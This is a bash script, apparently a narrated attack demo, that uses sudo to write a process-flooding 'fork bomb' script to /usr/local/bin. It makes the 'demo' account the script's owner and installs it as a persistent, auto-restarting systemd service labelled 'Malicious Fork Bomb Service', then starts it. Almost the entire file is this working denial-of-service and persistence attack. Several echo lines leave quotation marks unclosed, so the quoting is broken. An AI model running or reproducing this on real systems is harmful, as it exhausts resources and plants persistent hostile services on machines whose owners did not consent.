Green='\033[0;32m'
Color_Off='\033[0m'

echo -e "$Green"

echo "###########################################################"
echo "#####           Creating a fork bomb script           #####"
echo "###########################################################"
echo ""
echo "   $ sudo touch /usr/local/bin/fork_bomb.sh
sleep 5
echo ""
sshpass -p $PASSWORD sudo touch /usr/local/bin/fork_bomb.sh
echo ""
echo ""
sleep 5

echo "###########################################################"
echo "#####      Adding content to the fork bomb scipt      #####"
echo "###########################################################"
echo ""
echo "   $ sudo tee /usr/local/bin/fork_bomb.sh
sleep 5
echo ""
sshpass -p $PASSWORD sudo tee /usr/local/bin/fork_bomb.sh > /dev/null << EOF
#!/bin/bash

create_child_process() {
    sleep 9999 &
    child_pid=\$!
    echo "Created child process with PID: \$child_pid"
}

trap 'kill \$(jobs -p); exit' SIGINT SIGTERM

while true
do
    for i in \$(seq 1 60);
    do
        create_child_process
    done
    sleep 30
done
EOF
echo ""
echo ""
sleep 5

echo "###########################################################"
echo "#####  Granting execution permissions for the script  #####"
echo "###########################################################"
echo ""
echo "   $ sudo chmod +x /usr/local/bin/fork_bomb.sh
sleep 5
echo ""
sshpass -p $PASSWORD sudo chmod +x /usr/local/bin/fork_bomb.sh
echo ""
echo ""
sleep 5

echo "###########################################################"
echo "#####  Granting ownership to attacker for the script  #####"
echo "###########################################################"
echo ""
echo "   $ sudo chown demo: /usr/local/bin/fork_bomb.sh
sleep 5
echo ""
sshpass -p $PASSWORD sudo chown demo: /usr/local/bin/fork_bomb.sh
echo ""
echo ""
sleep 5

echo "###########################################################"
echo "#####     Creating a daemon for fork bomb attack      #####"
echo "###########################################################"
echo ""
echo "   $ sudo touch /etc/systemd/system/fork.service
sleep 5
echo ""
sshpass -p $PASSWORD sudo touch /etc/systemd/system/fork.service
echo ""
echo ""
sleep 5

echo "###########################################################"
echo "#####        Adding content to the daemon file        #####"
echo "###########################################################"
echo ""
echo "   $ sudo tee /etc/systemd/system/fork.service
sleep 5
echo ""
sshpass -p $PASSWORD sudo tee /etc/systemd/system/fork.service > /dev/null << EOF
[Unit]
Description=Malicious Fork Bomb Service
After=network.target

[Service]
ExecStart=/usr/local/bin/fork_bomb.sh
ExecStop=/bin/kill -s SIGTERM \$MAINPID
Restart=always
User=demo
KillMode=process
Type=simple

[Install]
WantedBy=multi-user.target
EOF
echo ""
echo ""
sleep 5

echo "###########################################################"
echo "#####            Reloading Linux daemons              #####"
echo "###########################################################"
echo ""
echo "   $ sudo touch /etc/systemd/system/fork.service
sleep 5
echo ""
sshpass -p $PASSWORD sudo touch /etc/systemd/system/fork.service
echo ""
echo ""
sleep 5

echo "###########################################################"
echo "#####     Creating a daemon for fork bomb attack      #####"
echo "###########################################################"
echo ""
echo "   $ sudo systemctl daemon-reload
sleep 5
echo ""
sshpass -p $PASSWORD sudo systemctl daemon-reload
echo ""
echo ""
sleep 5

echo "###########################################################"
echo "#####      Starting the fork bomb daemon attack       #####"
echo "###########################################################"
echo ""
echo "   $ sudo systemctl start fork.service
sleep 5
echo ""
sshpass -p $PASSWORD sudo systemctl start fork.service
echo ""
echo ""
sleep 5

echo -e "$Color_Off"
